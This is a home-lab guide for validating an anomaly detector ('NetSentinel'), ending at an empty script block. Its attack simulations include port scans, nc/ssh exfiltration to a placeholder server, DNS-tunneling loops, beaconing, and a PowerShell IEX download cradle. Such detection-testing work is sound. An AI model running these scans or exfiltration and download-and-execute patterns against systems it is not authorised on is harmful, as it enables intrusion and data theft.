# NetSentinel Testing Guide: Home-Lab Anomaly Detection Validation

> **Version:** 1.0
> **Last Updated:** January 2026
> **Audience:** IT Administrators, Security Testers

## Table of Contents
1. [Network Topology](#1-network-topology)
2. [Enabling NetFlow/IPFIX](#2-enabling-netflowipfix)
3. [Baseline Learning Phase](#3-baseline-learning-phase)
4. [Safe Anomaly Test Cases](#4-safe-anomaly-test-cases)
5. [Alert Verification](#5-alert-verification)
6. [Evaluation Checklist](#6-evaluation-checklist)
7. [Extending Tests](#7-extending-tests)

---

## 1. Network Topology

```
                           ┌─────────────────────────────────────────────────────────┐
                           │                      INTERNET                           │
                           └─────────────────────────┬───────────────────────────────┘
                                                     │
                                                     │ WAN
                                              ┌──────┴──────┐
                                              │   ROUTER    │
                                              │ (pfSense/   │
                                              │  OpenWRT/   │
                                              │  MikroTik)  │
                                              │             │
                                              │ NetFlow     │
                                              │ Exporter    │
                                              └──────┬──────┘
                                                     │
                           ┌─────────────────────────┼─────────────────────────┐
                           │                         │                         │
                           │ LAN                     │ LAN                     │ Wi-Fi
                           │ :2055 UDP               │                         │
                    ┌──────┴──────┐          ┌──────┴──────┐          ┌───────┴───────┐
                    │  COLLECTOR  │          │   DESKTOP   │          │    LAPTOP     │
                    │   SERVER    │          │     PC      │          │   (Wi-Fi)     │
                    │             │          │             │          │               │
                    │ 192.168.1.10│          │192.168.1.20 │          │ 192.168.1.30  │
                    │             │          │             │          │               │
                    │ - Collector │          │ - Test      │          │ - Test        │
                    │ - Backend   │          │   Source    │          │   Source      │
                    │ - Dashboard │          │ - Linux/Win │          │ - macOS/Win   │
                    │ - Database  │          │             │          │               │
                    └─────────────┘          └─────────────┘          └───────────────┘

    Data Flow:
    ──────────
    1. All devices generate normal network traffic
    2. Router observes all flows and exports NetFlow v9 to Collector (UDP 2055)
    3. Collector processes flows → Backend → TimescaleDB
    4. ML pipeline analyzes behavior → Generates alerts
    5. Dashboard displays alerts and explanations
```

### IP Address Assignments (Example)

| Device | IP Address | Role |
|--------|------------|------|
| Router | 192.168.1.1 | Gateway, NetFlow Exporter |
| Collector Server | 192.168.1.10 | NetSentinel Platform |
| Desktop PC | 192.168.1.20 | Test Source (Wired) |
| Laptop | 192.168.1.30 | Test Source (Wi-Fi) |
| Optional IoT | 192.168.1.40-50 | Additional baseline devices |

---

## 2. Enabling NetFlow/IPFIX

### 2.1 pfSense

```bash
# 1. Install softflowd package
System → Package Manager → Available Packages → softflowd → Install

# 2. Configure NetFlow export
Services → softflowd → Add

Settings:
  - Interface: LAN (or select all relevant interfaces)
  - Host: 192.168.1.10        # Collector IP
  - Port: 2055                 # Collector port
  - Max Flows: 8192
  - NetFlow Version: 9
  - Tracking Level: Full (bidirectional)
  - Sample Rate: 1 (1:1, no sampling for small networks)

# 3. Save and enable
```

### 2.2 OpenWRT

```bash
# SSH into router
ssh root@192.168.1.1

# Install softflowd
opkg update
opkg install softflowd

# Configure /etc/config/softflowd
cat > /etc/config/softflowd << 'EOF'
config softflowd
    option enabled '1'
    option interface 'br-lan'
    option host '192.168.1.10'
    option port '2055'
    option max_flows '8192'
    option timeout 'maxlife=300'
    option netflow_version '9'
    option tracking_level '2'
EOF

# Start the service
/etc/init.d/softflowd restart
/etc/init.d/softflowd enable

# Verify it's running
ps | grep softflowd
netstat -ul | grep 2055
```

### 2.3 MikroTik RouterOS

```bash
# Connect via Winbox or SSH

# Enable traffic flow (NetFlow)
/ip traffic-flow
set enabled=yes interfaces=ether1,ether2,bridge cache-entries=16k active-flow-timeout=5m

# Configure export target
/ip traffic-flow target
add address=192.168.1.10:2055 version=9

# Verify configuration
/ip traffic-flow print
/ip traffic-flow target print
```

### 2.4 Ubiquiti EdgeRouter

```bash
# SSH into router
ssh admin@192.168.1.1

# Configure NetFlow
configure
set system flow-accounting interface eth1
set system flow-accounting netflow server 192.168.1.10 port 2055
set system flow-accounting netflow version 9
set system flow-accounting netflow timeout expiry-interval 60
set system flow-accounting netflow timeout max-active-life 300
commit
save
exit

# Verify
show flow-accounting
```

### 2.5 Verification (All Routers)

Run this on your collector server to verify flows are arriving:

```bash
# Check if flows are being received
docker logs netsentinel-collector --tail 50

# Expected output:
# time="..." level=info msg="UDP server started" port=2055
# time="..." level=info msg="Received NetFlow packet" source="192.168.1.1:xxxxx" bytes=XXX
# time="..." level=info msg="Ingested 100 flows" batch_id=...

# Alternative: tcpdump to see raw packets
sudo tcpdump -i any port 2055 -nn -c 10
```

---

## 3. Baseline Learning Phase

### 3.1 Objectives

The baseline phase teaches the system what "normal" looks like for each device. This involves:
- Typical destinations contacted
- Normal traffic volumes
- Usual protocols and ports
- Time-of-day patterns
- Connection patterns (many small vs few large)

### 3.2 Duration

| Network Size | Recommended Baseline Period |
|--------------|----------------------------|
| 2-5 devices (home lab) | 3-5 days minimum |
| 5-20 devices (small office) | 5-7 days |
| 20+ devices (SME) | 7-14 days |

**Why this long?** You need to capture:
- Weekday vs weekend patterns
- Automatic updates (Windows Update, app updates)
- Backup schedules
- Normal browsing diversity

### 3.3 Normal Traffic to Generate

During baseline, use your devices naturally. Here's a checklist:

#### Desktop PC Activities
```bash
# Day 1-2: Normal work simulation
- Web browsing (news, documentation, shopping)
- Email (webmail or client)
- Video streaming (YouTube, Netflix - 1-2 hours)
- Software updates (Windows Update, apt upgrade)
- File downloads (legitimate software)

# Day 3-4: Work applications
- Cloud storage sync (Dropbox, OneDrive, Google Drive)
- Video conferencing (Zoom, Teams - 30 min call)
- SSH to your own servers (if applicable)
- Database tools, IDEs, office applications

# Day 5: Edge cases
- Large file download (Linux ISO, ~4GB)
- Streaming music (Spotify, 2-3 hours)
- Online gaming (if typical for this device)
```

#### Laptop Activities
```bash
# Similar to desktop, plus:
- Connect/disconnect from Wi-Fi multiple times
- Use on different days/times
- Mobile hotspot briefly (creates different gateway)
- VPN connection (if you normally use one)
```

#### What "Normal" Should Look Like in Dashboard

After baseline, check these metrics in NetSentinel:

| Metric | Normal Range (Home Lab) |
|--------|------------------------|
| Flows per hour | 500-5,000 |
| Unique destinations/day | 50-300 per device |
| Bytes per day | 1-50 GB depending on streaming |
| Top protocols | TCP (80%), UDP (15%), ICMP (<1%) |
| Top ports | 443 (HTTPS), 80 (HTTP), 53 (DNS) |
| Anomaly score baseline | 0.05-0.25 |

### 3.4 Baseline Verification Commands

Run these to confirm normal behavior is being captured:

```bash
# Check flow counts in database
docker exec netsentinel-db psql -U netsentinel -d netsentinel -c "
SELECT
    DATE(ts_start) as date,
    COUNT(*) as flows,
    COUNT(DISTINCT src_ip) as unique_sources,
    COUNT(DISTINCT dst_ip) as unique_destinations,
    pg_size_pretty(SUM(bytes)::bigint) as total_bytes
FROM flows_raw
WHERE site_id = '60b03fb5-0c97-4c4b-bd6e-79cb0b86db60'
GROUP BY DATE(ts_start)
ORDER BY date DESC
LIMIT 7;
"

# Check per-device statistics
docker exec netsentinel-db psql -U netsentinel -d netsentinel -c "
SELECT
    src_ip,
    COUNT(*) as flows,
    COUNT(DISTINCT dst_ip) as unique_dests,
    COUNT(DISTINCT dst_port) as unique_ports
FROM flows_raw
WHERE site_id = '60b03fb5-0c97-4c4b-bd6e-79cb0b86db60'
  AND ts_start > NOW() - INTERVAL '24 hours'
GROUP BY src_ip
ORDER BY flows DESC;
"
```

---

## 4. Safe Anomaly Test Cases

### IMPORTANT SAFETY NOTES

```
⚠️  BEFORE RUNNING ANY TESTS:
    1. Only test on networks you own or have written permission to test
    2. Notify household members that testing is occurring
    3. Temporarily disable any security tools that might interfere
    4. Document start/end times for each test
    5. All tests target YOUR OWN devices or safe public services
```

---

### Test Case 1: Internal Port Scan (Lateral Movement Simulation)

**What it simulates:** An attacker scanning your network to find vulnerable services.

**Why it's detected:** Sudden spike in unique destination IPs and ports from a single source.

#### Commands

**Linux/macOS:**
```bash
# Scan your own subnet (only 10 hosts to be safe)
# This will scan common ports on local network devices
nmap -sT -p 22,80,443,445,3389,8080 192.168.1.1-10 --max-rate 50

# Slower, stealthier scan (should still be detected)
nmap -sT -p 1-1000 192.168.1.1-5 --max-rate 10 -T2

# Record the time
echo "Port scan started at $(date)"
```

**Windows (PowerShell):**
```powershell
# Simple port check across subnet
$ports = @(22, 80, 443, 445, 3389, 8080)
$subnet = "192.168.1"

1..10 | ForEach-Object {
    $ip = "$subnet.$_"
    foreach ($port in $ports) {
        $tcp = New-Object System.Net.Sockets.TcpClient
        try {
            $tcp.Connect($ip, $port)
            Write-Host "Open: $ip`:$port"
            $tcp.Close()
        } catch {}
    }
}
Write-Host "Scan completed at $(Get-Date)"
```

#### Expected Anomaly Characteristics

| Feature | Normal | During Test |
|---------|--------|-------------|
| Unique dst_ip (5 min) | 5-20 | 50-100+ |
| Unique dst_port (5 min) | 3-10 | 100-1000+ |
| Flows per minute | 10-50 | 200-500+ |
| Connection failures | <5% | 70-90% |
| Port entropy | Low | Very High |

#### Expected Alert Explanation

```
🚨 HIGH SEVERITY ALERT: Port Scanning Activity Detected

Device: 192.168.1.20 (Desktop-PC)
Time: 2024-01-15 14:32:00 UTC
Anomaly Score: 0.92

Summary:
This device contacted 47 different internal IP addresses and attempted
connections on 156 unique ports within 5 minutes. This is 23x more
destinations and 78x more ports than its normal behavior.

Key Deviations:
• Unique destinations: 47 (baseline: 2) — +2250% increase
• Unique ports: 156 (baseline: 2) — +7700% increase
• Failed connections: 89% (baseline: 3%)
• Port entropy: 4.2 (baseline: 0.8)

This pattern is consistent with network reconnaissance or port scanning.
Legitimate causes might include: network discovery tools, vulnerability
scanners, or misconfigured software.

Recommended Actions:
1. Verify this activity was authorized
2. Check what software was running on this device at 14:32
3. If unexpected, investigate the device for compromise
```

---

### Test Case 2: External Port Scan (Reconnaissance)

**What it simulates:** Scanning external hosts (safely using scan-allowed services).

**Why it's detected:** Unusual pattern of connections to many ports on external hosts.

#### Commands

```bash
# Use scanme.nmap.org - a server explicitly set up to allow scanning
# This is safe and legal
nmap -sT -p 1-1000 scanme.nmap.org --max-rate 100

# Record time
echo "External scan at $(date)"
```

#### Expected Alert

```
🚨 MEDIUM SEVERITY ALERT: Unusual External Scanning Pattern

Device: 192.168.1.20
Target: 45.33.32.156 (scanme.nmap.org)

Summary:
This device attempted connections on 1000 different ports to a single
external host within 2 minutes. Normal behavior shows 2-5 ports per
destination.

This may indicate: port scanning, service enumeration, or security testing.
```

---

### Test Case 3: Data Exfiltration Simulation

**What it simulates:** Large, unusual data transfer to an external destination.

**Why it's detected:** Abnormal bytes_out, unusual destination, sustained high-bandwidth connection.

#### Commands

**Linux/macOS:**
```bash
# Method 1: Upload large file to your own server (if you have one)
# Replace with your own server
dd if=/dev/urandom bs=1M count=500 | ssh user@your-server.com "cat > /dev/null"

# Method 2: Upload to a speed test service (generates legitimate large upload)
curl -o /dev/null -w "%{speed_upload}\n" \
  --data-binary @/dev/urandom \
  --limit-rate 10M \
  https://speed.cloudflare.com/__up

# Method 3: Create and upload large file to cloud storage you own
dd if=/dev/urandom of=/tmp/testfile.bin bs=1M count=200
# Then upload via browser to your Google Drive/Dropbox
# Delete after test

# Method 4: Netcat to your own server (simulates raw exfil)
# On receiving server: nc -l 9999 > /dev/null
# On test device:
dd if=/dev/urandom bs=1M count=100 | nc your-server.com 9999
```

**Windows:**
```powershell
# Generate and upload via browser
$bytes = New-Object byte[] 104857600  # 100MB
(New-Object Random).NextBytes($bytes)
[IO.File]::WriteAllBytes("C:\temp\testfile.bin", $bytes)
Write-Host "Upload C:\temp\testfile.bin to your cloud storage"
Write-Host "Test completed at $(Get-Date)"
# Delete file after upload
```

#### Expected Anomaly Characteristics

| Feature | Normal | During Test |
|---------|--------|-------------|
| Bytes out (5 min) | 1-10 MB | 100-500 MB |
| Single flow bytes | <10 MB | 100+ MB |
| Upload/Download ratio | 0.1 (download heavy) | 10+ (upload heavy) |
| Flow duration | <60 sec | 300+ sec |
| Destination | Common CDNs | New/rare IP |

#### Expected Alert

```
🚨 HIGH SEVERITY ALERT: Potential Data Exfiltration

Device: 192.168.1.20
Destination: 203.0.113.50 (new destination)
Duration: 5 minutes

Summary:
This device transferred 487 MB of data to an external server that has
never been contacted before. This is 97x more data than typically sent
to any single destination and represents 89% outbound traffic (normally 12%).

Key Deviations:
• Bytes uploaded: 487 MB (baseline: 5 MB) — +9640% increase
• Upload ratio: 0.89 (baseline: 0.12) — +642% increase
• New destination: First contact ever observed
• Flow duration: 312 seconds (baseline: 23 seconds)

This pattern matches data exfiltration or large backup upload.
Verify this transfer was authorized.
```

---

### Test Case 4: C2 Beaconing Simulation

**What it simulates:** Malware calling home at regular intervals.

**Why it's detected:** Periodic connection pattern, unusual regularity, uncommon destination.

#### Commands

**Linux/macOS:**
```bash
# Beacon every 60 seconds for 30 minutes
# Using a public server that responds (httpbin.org)

for i in {1..30}; do
    echo "[$(date)] Beacon $i"
    curl -s -o /dev/null -w "%{http_code}\n" https://httpbin.org/get
    sleep 60
done

# More sophisticated: Add jitter (still detectable)
for i in {1..30}; do
    JITTER=$((RANDOM % 10))
    SLEEP_TIME=$((55 + JITTER))
    echo "[$(date)] Beacon $i (sleeping ${SLEEP_TIME}s)"
    curl -s -o /dev/null https://httpbin.org/get
    sleep $SLEEP_TIME
done
```

**Windows:**
```powershell
# Beacon every 60 seconds for 30 minutes
1..30 | ForEach-Object {
    Write-Host "[$(Get-Date)] Beacon $_"
    Invoke-WebRequest -Uri "https://httpbin.org/get" -UseBasicParsing | Out-Null
    Start-Sleep -Seconds 60
}
```

**Python (cross-platform):**
```python
#!/usr/bin/env python3
"""C2 Beacon Simulator - For testing anomaly detection only"""
import time
import requests
from datetime import datetime

BEACON_URL = "https://httpbin.org/get"
INTERVAL = 60  # seconds
COUNT = 30

print(f"Starting beacon simulation: {COUNT} beacons, {INTERVAL}s interval")

for i in range(COUNT):
    try:
        requests.get(BEACON_URL, timeout=10)
        print(f"[{datetime.now()}] Beacon {i+1}/{COUNT} sent")
    except Exception as e:
        print(f"[{datetime.now()}] Beacon failed: {e}")

    if i < COUNT - 1:
        time.sleep(INTERVAL)

print("Beacon simulation complete")
```

#### Expected Anomaly Characteristics

| Feature | Normal | During Test |
|---------|--------|-------------|
| Connection regularity | Random | Highly periodic |
| Inter-flow interval variance | High (30+ sec) | Very low (<5 sec) |
| Unique dest over time | Growing | Static (1) |
| Packet sizes | Variable | Consistent |

#### Expected Alert

```
🚨 MEDIUM SEVERITY ALERT: Periodic Beaconing Pattern Detected

Device: 192.168.1.30 (Laptop)
Destination: 54.166.163.67 (httpbin.org)
Duration: Ongoing (28 minutes observed)

Summary:
This device has been making HTTP connections to a single external server
at remarkably regular intervals of 60±3 seconds. This consistency is
unusual for normal browsing and matches command-and-control beaconing
patterns.

Key Indicators:
• Connections observed: 28
• Average interval: 60.2 seconds
• Interval variance: 2.1 seconds (normal: 45+ seconds)
• Same destination: 100% of connections

This pattern is characteristic of:
- Malware beaconing
- Heartbeat monitoring systems
- Scheduled API polling

If this is a legitimate monitoring tool, consider whitelisting.
```

---

### Test Case 5: DNS Tunneling Simulation

**What it simulates:** Data exfiltration via DNS queries.

**Why it's detected:** Abnormal DNS query volume, unusual query lengths, uncommon domains.

#### Commands

**Linux:**
```bash
# Generate many DNS queries to simulate tunneling
# Uses your own controlled domain or test domains

# Method 1: High-volume queries
for i in {1..500}; do
    RANDOM_SUB=$(head /dev/urandom | tr -dc 'a-z0-9' | head -c 32)
    dig +short ${RANDOM_SUB}.example.com @8.8.8.8 > /dev/null 2>&1
done
echo "DNS tunnel simulation complete at $(date)"

# Method 2: Long subdomain queries (simulates data in DNS)
for i in {1..100}; do
    # 63 chars is max subdomain length
    LONG_SUB=$(head /dev/urandom | tr -dc 'a-z0-9' | head -c 60)
    nslookup ${LONG_SUB}.test.example.com > /dev/null 2>&1
done
```

**Windows:**
```powershell
# Generate unusual DNS patterns
1..500 | ForEach-Object {
    $random = -join ((48..57) + (97..122) | Get-Random -Count 32 | ForEach-Object {[char]$_})
    Resolve-DnsName -Name "$random.example.com" -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "DNS simulation complete at $(Get-Date)"
```

#### Expected Alert

```
🚨 MEDIUM SEVERITY ALERT: DNS Anomaly - Possible Tunneling

Device: 192.168.1.20
Time Window: 14:45:00 - 14:50:00 UTC

Summary:
This device generated 500 DNS queries in 5 minutes, compared to a
baseline of 15-30 queries. The queries show unusual characteristics:

• Query volume: 500 (baseline: 25) — +1900% increase
• Unique subdomains: 498 (baseline: 8)
• Average query length: 45 chars (baseline: 18 chars)
• All queries to: *.example.com

This pattern suggests DNS tunneling or data exfiltration via DNS.
```

---

### Test Case 6: Cryptocurrency Mining Simulation

**What it simulates:** Cryptomining traffic patterns (without actual mining).

**Why it's detected:** Sustained connections to mining pools, characteristic port usage.

#### Commands

```bash
# Simulate mining pool connections (connection only, no actual mining)
# Uses known mining pool ports but just establishes TCP connections

# Stratum ports commonly used by miners
MINING_PORTS=(3333 4444 8888 9999 14444)

for port in "${MINING_PORTS[@]}"; do
    # Just attempt connection to show the pattern
    # These will likely fail but generate flow data
    timeout 5 nc -zv stratum.example.com $port 2>&1 || true
done

# Sustained connection simulation (to your own server)
# On your server: nc -l 3333 -k
# On test device:
while true; do
    echo "mining_subscribe" | nc -w 5 your-server.com 3333
    sleep 30
done
# Run for 10 minutes then Ctrl+C
```

#### Expected Alert

```
🚨 HIGH SEVERITY ALERT: Potential Cryptocurrency Mining Activity

Device: 192.168.1.20
Destinations: Multiple known mining pool IPs

Summary:
This device established long-duration connections on ports commonly
associated with cryptocurrency mining (3333, 4444). The connection
pattern shows:

• Sustained connections: 10+ minutes each
• Mining-associated ports: 3333, 4444
• Low but constant data exchange
• Multiple mining pool IPs contacted

Cryptomining may indicate: compromised system, unauthorized software,
or intentional mining. Verify if this activity is authorized.
```

---

### Test Case 7: Time-of-Day Anomaly

**What it simulates:** Device active during unusual hours.

**Why it's detected:** Activity outside normal usage patterns.

#### Commands

```bash
# Schedule activity for 3 AM (adjust for your timezone)
# Linux/macOS
echo "curl -s https://www.google.com && wget -q -O /dev/null https://www.bing.com" | at 3:00 AM

# Or use cron for repeated testing
crontab -e
# Add: 0 3 * * * curl -s https://www.google.com; curl -s https://www.bing.com

# Windows Task Scheduler (PowerShell as Admin)
$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' `
    -Argument '-Command "Invoke-WebRequest https://www.google.com"'
$trigger = New-ScheduledTaskTrigger -Daily -At 3:00AM
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AnomalyTest"
```

#### Expected Alert

```
🚨 LOW SEVERITY ALERT: Unusual Time-of-Day Activity

Device: 192.168.1.20 (Desktop-PC)
Time: 03:00:00 UTC (local: 03:00 AM)

Summary:
This device generated network traffic at 3:00 AM. Historical data shows
this device is normally inactive between 11 PM and 7 AM (99.5% of days).

• Activity detected: 03:00-03:05 AM
• Normal active hours: 8 AM - 11 PM
• Historical 3 AM activity: 0.5% of days

This could indicate: scheduled tasks, remote access, or compromise.
```

---

### Test Case 8: New/Rare Destination Access

**What it simulates:** Connecting to a never-before-seen destination.

**Why it's detected:** First contact with a new IP/domain.

#### Commands

```bash
# Connect to legitimate but uncommon services
# These are real, safe services you likely haven't visited

curl -s https://www.gov.uk > /dev/null
curl -s https://www.nist.gov > /dev/null
curl -s https://www.cern.ch > /dev/null
curl -s https://arxiv.org > /dev/null

# Or use IP addresses directly (Google DNS, Cloudflare)
curl -s http://1.1.1.1 > /dev/null
ping -c 3 208.67.222.222  # OpenDNS
```

#### Expected Alert

```
🚨 LOW SEVERITY ALERT: New Destination Contact

Device: 192.168.1.20
New Destinations: 4 first-time contacts

Summary:
This device contacted 4 IP addresses/domains that have never been
observed in the 7-day baseline period:

• gov.uk (151.101.0.144) - UK Government
• nist.gov (129.6.13.49) - US Standards Institute
• cern.ch (188.184.9.234) - European Research
• arxiv.org (151.101.200.42) - Academic Papers

New destination contacts are normal but tracked for awareness.
High volumes of new destinations may warrant investigation.
```

---

### Test Case 9: Protocol Anomaly

**What it simulates:** Using unusual protocols or ports.

**Why it's detected:** Deviation from normal protocol distribution.

#### Commands

```bash
# Generate ICMP traffic (unusual volume)
ping -c 100 -i 0.1 8.8.8.8

# Generate traffic on unusual port
# On your own server: nc -l 31337
# On test device:
for i in {1..50}; do
    echo "test data $i" | nc -w 1 your-server.com 31337
done

# Or use netcat to localhost (if you have a listener)
# Unusual high-port traffic
nc -zv localhost 40000-40100
```

#### Expected Alert

```
🚨 MEDIUM SEVERITY ALERT: Protocol Distribution Anomaly

Device: 192.168.1.20
Time: 15:30:00 UTC

Summary:
Network protocol distribution for this device shows unusual patterns:

Normal Distribution:
• TCP: 85%, UDP: 14%, ICMP: 1%

Current Distribution (last 5 min):
• TCP: 45%, UDP: 10%, ICMP: 45%

Key Finding:
• ICMP traffic: 45% (baseline: 1%) — +4400% increase
• 100 ICMP packets in 10 seconds

High ICMP may indicate: ping sweeps, ICMP tunneling, or network testing.
```

---

### Test Case 10: Rapid Burst Traffic

**What it simulates:** Sudden traffic spike (DoS preparation or compromised host).

**Why it's detected:** Traffic volume far exceeds baseline.

#### Commands

```bash
# Generate burst of connections (to your own server or test service)
# Using Apache Bench (ab) for controlled burst
ab -n 1000 -c 50 https://httpbin.org/get

# Or using curl
for i in {1..100}; do
    curl -s https://httpbin.org/get &
done
wait
echo "Burst complete at $(date)"

# Python alternative
python3 << 'EOF'
import requests
import concurrent.futures

def make_request(i):
    requests.get("https://httpbin.org/get", timeout=10)
    return i

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    list(executor.map(make_request, range(200)))
print("Burst complete")
EOF
```

#### Expected Alert

```
🚨 HIGH SEVERITY ALERT: Traffic Burst Detected

Device: 192.168.1.20
Time: 15:45:00 UTC
Duration: 30 seconds

Summary:
This device generated a sudden burst of network traffic far exceeding
normal patterns:

• Connections (30 sec): 1,000 (baseline: 15)
• Flows per second: 33 (baseline: 0.5)
• Concurrent connections: 50+ (baseline: 3)

This pattern matches: load testing, DoS activity, or botnet behavior.
```

---

## 5. Alert Verification

### 5.1 Dashboard Checks

After each test, verify detection in the NetSentinel dashboard:

```
1. Navigate to: http://localhost:3000
2. Log in with your credentials
3. Go to: Alerts page

Check for:
□ New alert created within expected time window
□ Correct severity level
□ Source IP matches test device
□ Alert type matches test performed
□ Anomaly score > 0.7 for high-severity tests
```

### 5.2 Database Verification

```bash
# Check alerts generated in last hour
docker exec netsentinel-db psql -U netsentinel -d netsentinel -c "
SELECT
    created_at,
    severity,
    alert_type,
    title,
    peak_score,
    status
FROM alerts
WHERE site_id = '60b03fb5-0c97-4c4b-bd6e-79cb0b86db60'
  AND created_at > NOW() - INTERVAL '1 hour'
ORDER BY created_at DESC;
"

# Check flow patterns during test window
docker exec netsentinel-db psql -U netsentinel -d netsentinel -c "
SELECT
    time_bucket('1 minute', ts_start) as minute,
    src_ip,
    COUNT(*) as flows,
    COUNT(DISTINCT dst_ip) as unique_dests,
    COUNT(DISTINCT dst_port) as unique_ports,
    SUM(bytes) as total_bytes
FROM flows_raw
WHERE ts_start > NOW() - INTERVAL '30 minutes'
GROUP BY minute, src_ip
ORDER BY minute DESC, flows DESC
LIMIT 20;
"
```

### 5.3 Metrics to Check

| Metric | Where to Find | What to Look For |
|--------|---------------|------------------|
| Anomaly Score | Alert detail page | Score > 0.7 for tests |
| Feature Deviations | Alert explanation | 100%+ deviation in key features |
| Flow Counts | Dashboard overview | Spike during test window |
| Unique Destinations | Device detail page | Sharp increase during scans |
| Bytes Transferred | Traffic chart | Spike during exfil tests |

### 5.4 Distinguishing True vs False Positives

**True Positive Indicators:**
- Alert timing matches your test execution time
- Source IP matches test device
- Feature deviations align with test type
- Anomaly score correlates with test intensity

**False Positive Indicators:**
- Alert occurs without any test running
- Source is a device you weren't testing
- Description doesn't match network activity
- Repeated alerts for normal activities (updates, backups)

**Recording Results:**

```markdown
## Test Record Template

**Test:** Port Scan Simulation
**Date/Time:** 2024-01-15 14:30:00 UTC
**Device:** Desktop PC (192.168.1.20)
**Command:** `nmap -sT -p 1-1000 192.168.1.1-10`

**Expected Result:**
- HIGH severity alert
- "Port Scanning" or "Reconnaissance" type
- Score > 0.85

**Actual Result:**
- [ ] Alert generated: YES / NO
- [ ] Severity: ___________
- [ ] Score: ___________
- [ ] Time to detect: ___ minutes
- [ ] Explanation quality: Clear / Unclear / Missing

**Notes:**
_________________________________
```

---

## 6. Evaluation Checklist

Use this checklist to assess whether NetSentinel is working correctly for your environment:

### Detection Effectiveness

| Test Case | Alert Generated? | Correct Severity? | Time to Detect | Score |
|-----------|-----------------|-------------------|----------------|-------|
| Port Scan (Internal) | □ Yes □ No | □ Yes □ No | ___ min | _____ |
| Port Scan (External) | □ Yes □ No | □ Yes □ No | ___ min | _____ |
| Data Exfiltration | □ Yes □ No | □ Yes □ No | ___ min | _____ |
| C2 Beaconing | □ Yes □ No | □ Yes □ No | ___ min | _____ |
| DNS Tunneling | □ Yes □ No | □ Yes □ No | ___ min | _____ |
| Crypto Mining | □ Yes □ No | □ Yes □ No | ___ min | _____ |
| Time Anomaly | □ Yes □ No | □ Yes □ No | ___ min | _____ |
| New Destination | □ Yes □ No | □ Yes □ No | ___ min | _____ |
| Protocol Anomaly | □ Yes □ No | □ Yes □ No | ___ min | _____ |
| Traffic Burst | □ Yes □ No | □ Yes □ No | ___ min | _____ |

**Detection Rate:** ___/10 tests detected = ___%

### Alert Quality

For each generated alert, rate these factors:

| Factor | Rating (1-5) | Notes |
|--------|--------------|-------|
| Explanation clarity | ___ | Could a non-expert understand it? |
| Technical accuracy | ___ | Does it correctly describe what happened? |
| Actionable guidance | ___ | Are recommended actions helpful? |
| Feature deviation display | ___ | Are the key metrics shown? |
| Timeline accuracy | ___ | Does the time match when you ran the test? |

**Average Quality Score:** ___/5

### False Positive Assessment

During 24 hours of normal use (no tests):

| Metric | Count | Acceptable? |
|--------|-------|-------------|
| Total alerts generated | ___ | <5 is good |
| Critical alerts | ___ | 0 expected |
| High alerts | ___ | <2 expected |
| Medium alerts | ___ | <3 expected |
| Low alerts | ___ | <5 acceptable |

**False Positive Rate:** ___ alerts/day during normal use

### Overall Verdict

```
□ PASS - Detection working well
  - 80%+ tests detected
  - Average quality score 4+
  - <5 false positives/day

□ NEEDS TUNING - Adjust thresholds
  - 60-80% tests detected
  - Some alerts unclear
  - 5-10 false positives/day

□ FAIL - Significant issues
  - <60% tests detected
  - Alerts confusing or missing
  - >10 false positives/day
```

---

## 7. Extending Tests

### 7.1 Larger Networks (10-50 devices)

```bash
# Additional considerations:
1. Segment network into VLANs
   - Create separate flow exports per VLAN
   - Compare cross-VLAN vs intra-VLAN alerts

2. Add device diversity
   - IoT devices (cameras, smart speakers)
   - Servers (NAS, media server)
   - Mobile devices

3. Increase baseline period to 14 days

4. Test lateral movement across VLANs:
   nmap -sT -p 22,445,3389 10.0.2.0/24  # From VLAN 1 to VLAN 2
```

### 7.2 Different Network Types

**Remote Office Simulation:**
```bash
# VPN traffic patterns
# Set up site-to-site VPN, then test:
- Large file transfers over VPN
- VPN beaconing patterns
- Split-tunnel anomalies
```

**Cloud Hybrid:**
```bash
# If you have cloud resources:
- Test connections to cloud VMs
- Simulate cloud data exfiltration
- Test cloud service anomalies (unusual AWS/Azure endpoints)
```

### 7.3 Advanced Test Cases

**Slow and Low Scan:**
```bash
# Very slow scan to test detection sensitivity
nmap -sT -p 1-100 192.168.1.1-5 --max-rate 1 -T1
# 1 packet per second - harder to detect
```

**Encrypted Exfiltration:**
```bash
# Data over HTTPS (harder to detect by volume only)
# Requires your own HTTPS server
curl -X POST https://your-server.com/upload \
  -H "Content-Type: application/octet-stream" \
  --data-binary @largefile.bin
```

**Living-off-the-Land:**
```bash
# Use legitimate tools for suspicious purposes
# PowerShell download cradle pattern
powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://httpbin.org/html')"
```

### 7.4 Automation Script

Save this as `run_all_tests.sh` for repeatable testing:

```bash
#!/bin/bash
# NetSentinel Test Suite
# Run all safe anomaly tests with timing

LOG_FILE="test_results_$(date +%Y%m%d_%H%M%S).log"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

run_test() {
    TEST_NAME=$1
    TEST_CMD=$2

    log "=== Starting: $TEST_NAME ==="
    log "Command: $TEST_CMD"

    START_TIME=$(date +%s)
    eval $TEST_CMD
    END_TIME=$(date +%s)

    DURATION=$((END_TIME - START_TIME))
    log "=== Completed: $TEST_NAME (${DURATION}s) ==="
    log "Check dashboard for alert within next 5 minutes"
    log ""

    # Wait between tests
    sleep 300  # 5 minutes
}

log "NetSentinel Test Suite Started"
log "Test device: $(hostname) / $(hostname -I | awk '{print $1}')"
log ""

# Test 1: Internal Port Scan
run_test "Internal Port Scan" \
    "nmap -sT -p 22,80,443,445,3389 192.168.1.1-10 --max-rate 50"

# Test 2: DNS Tunneling Sim
run_test "DNS Tunneling" \
    "for i in {1..200}; do dig +short \$(head /dev/urandom | tr -dc 'a-z0-9' | head -c 32).example.com @8.8.8.8 >/dev/null 2>&1; done"

# Test 3: Beaconing
run_test "C2 Beaconing (10 min)" \
    "for i in {1..10}; do curl -s https://httpbin.org/get >/dev/null; sleep 60; done"

# Test 4: Burst Traffic
run_test "Traffic Burst" \
    "for i in {1..100}; do curl -s https://httpbin.org/get & done; wait"

log ""
log "=== Test Suite Complete ==="
log "Results saved to: $LOG_FILE"
log "Review alerts at: http://localhost:3000/alerts"
```

### 7.5 Continuous Monitoring Test

For ongoing validation, set up a weekly test:

```bash
# Add to crontab (crontab -e)
# Run lightweight tests every Sunday at 2 AM

0 2 * * 0 /home/user/netsentinel_tests/weekly_test.sh
```

`weekly_test.sh`:
```bash
